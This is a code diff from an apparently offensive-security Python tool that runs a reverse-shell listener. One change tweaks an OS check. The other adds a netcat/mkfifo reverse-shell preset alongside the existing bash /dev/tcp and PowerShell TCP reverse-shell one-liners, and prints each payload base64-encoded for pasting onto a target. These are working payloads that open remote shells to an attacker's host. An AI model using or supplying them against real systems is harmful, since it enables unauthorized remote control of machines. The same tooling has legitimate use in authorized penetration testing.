@@ -73,18 +73,19 @@ pathlink = lambda path: f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{
 normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
 
 def Open(item, terminal=False):
-	if myOS == 'Linux' and not DISPLAY:
+	if myOS != 'Darwin' and not DISPLAY:
 		logger.error("No available $DISPLAY")
 		return False
 
 	if not terminal:
-		program = {'Linux':'xdg-open', 'Darwin':'open'}[myOS]
+		program = 'xdg-open' if myOS != 'Darwin' else 'open'
 		args = [item]
 	else:
-		program = {'Linux':'x-terminal-emulator', 'Darwin':'osascript'}[myOS]
-		if myOS == 'Linux':
+		if myOS != 'Darwin':
+			program = 'x-terminal-emulator'
 			args = ['-e', *shlex.split(item)]
-		elif myOS == 'Darwin':
+		else:
+			program = 'osascript'
 			args = ['-e', f'tell app "Terminal" to do script "{item}"']
 
 	if not shutil.which(program):
@@ -1866,6 +1867,7 @@ class Listener:
 		interfaces = Interfaces().list
 		presets = [
 			"setsid bash >& /dev/tcp/{}/{} 0>&1 &",
+			"rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_ &",
 			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
@@ -1881,7 +1883,9 @@ class Listener:
 			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
 			output.append(f"echo -n {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
 			output.append("")
-			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
+			output.append(f"echo -n {base64.b64encode(presets[1].format(ip, self.port).encode()).decode()}|base64 -d|sh")
+			output.append("")
+			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, self.port).encode("utf-16le")).decode())
 
 			output.extend(dedent(f"""
 			{paint('Metasploit').UNDERLINE}
